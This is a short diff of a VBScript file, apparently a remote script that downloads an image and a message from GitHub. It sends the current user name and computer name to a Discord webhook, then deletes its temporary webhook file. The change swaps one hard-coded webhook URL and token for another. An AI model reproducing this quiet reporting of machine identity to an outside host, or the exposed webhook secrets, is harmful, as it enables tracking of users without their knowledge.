@@ -7,7 +7,7 @@ Dim webhookURL, nomeUtente, nomePC
 ' URL ottimizzati per il download diretto
 urlImmagine = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/immagine.jpg"
 urlMessaggio = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/messaggio.txt"
-webhookURL = "https://discord.com/api/webhooks/1460587962629619847/8IK_koKZe-q3-2J_lj6BfhloqM8AnekQpqC_z9VVj0D49-4BaFZqpeSafRjC21KqjgmW"
+webhookURL = "https://discord.com/api/webhooks/1460655618762342512/NB6s7LMT9a4ef8DEMIG4G-zhiQOqmCDhCehN9YzZgHHVE3tTIB_60321-q9iq_KYhaBW"
  
 Set shell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
@@ -107,3 +107,4 @@ Sub InviaNotificaDiscordPS(webhook, utente, pc, messaggio)
     WScript.Sleep 2000
     If fso.FileExists(percorsoWebhook) Then fso.DeleteFile percorsoWebhook
 End Sub
+
